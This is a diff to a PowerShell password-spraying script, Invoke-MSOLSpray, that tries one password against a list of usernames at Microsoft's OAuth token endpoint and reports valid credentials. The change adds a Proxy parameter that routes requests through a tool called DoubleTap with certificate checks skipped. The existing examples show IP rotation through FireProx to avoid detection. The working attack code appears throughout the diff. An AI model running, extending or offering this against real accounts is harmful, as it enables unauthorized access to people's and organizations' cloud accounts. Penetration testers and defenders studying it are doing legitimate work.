@@ -33,7 +33,11 @@
         
         The URL to spray against. Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.
     
-    .EXAMPLE
+    .PARAMETER Proxy
+		
+		The address to proxy traffic through for DoubleTap
+	
+	.EXAMPLE
         
         C:\PS> Invoke-MSOLSpray -UserList .\userlist.txt -Password Winter2020
         Description
@@ -46,6 +50,13 @@
         Description
         -----------
         This command uses the specified FireProx URL to spray from randomized IP addresses and writes the output to a file. See this for FireProx setup: https://github.com/ustayready/fireprox.
+	
+	.EXAMPLE
+        
+        C:\PS> Invoke-MSOLSpray -UserList .\userlist.txt -Password P@ssword -OutFile valid-users.txt -Proxy http://127.0.0.1:8080
+        Description
+        -----------
+        This command forwards traffic through DoubleTap using the Proxy and SkipCertificateCheck flags of Invoke-WebRequest
 #>
   Param(
 
@@ -69,8 +80,15 @@
 
     [Parameter(Position = 4, Mandatory = $False)]
     [switch]
-    $Force
+    $Force,
+	
+	# Change the proxy if you need to point to something like DoubleTap
+	[Parameter(Position = 5, Mandatory = $False)]
+	[string]
+	$Proxy = ""
   )
+  
+	
     
     $ErrorActionPreference= 'silentlycontinue'
     $Usernames = Get-Content $UserList
@@ -94,7 +112,12 @@
         # Setting up the web request
         $BodyParams = @{'resource' = 'https://graph.windows.net'; 'client_id' = '1b730954-1685-4b74-9bfd-dac224a7b894' ; 'client_info' = '1' ; 'grant_type' = 'password' ; 'username' = $username ; 'password' = $password ; 'scope' = 'openid'}
         $PostHeaders = @{'Accept' = 'application/json'; 'Content-Type' =  'application/x-www-form-urlencoded'}
-        $webrequest = Invoke-WebRequest $URL/common/oauth2/token -Method Post -Headers $PostHeaders -Body $BodyParams -ErrorVariable RespErr 
+        If($Proxy -eq "") {
+			$webrequest = Invoke-WebRequest $URL/common/oauth2/token -Method Post -Headers $PostHeaders -Body $BodyParams -ErrorVariable RespErr
+		}
+		else{
+			$webrequest = Invoke-WebRequest $URL/common/oauth2/token -Method Post -Headers $PostHeaders -Body $BodyParams -Proxy $Proxy -SkipCertificateCheck -ErrorVariable RespErr
+		}
 
         # If we get a 200 response code it's a valid cred
         If ($webrequest.StatusCode -eq "200"){
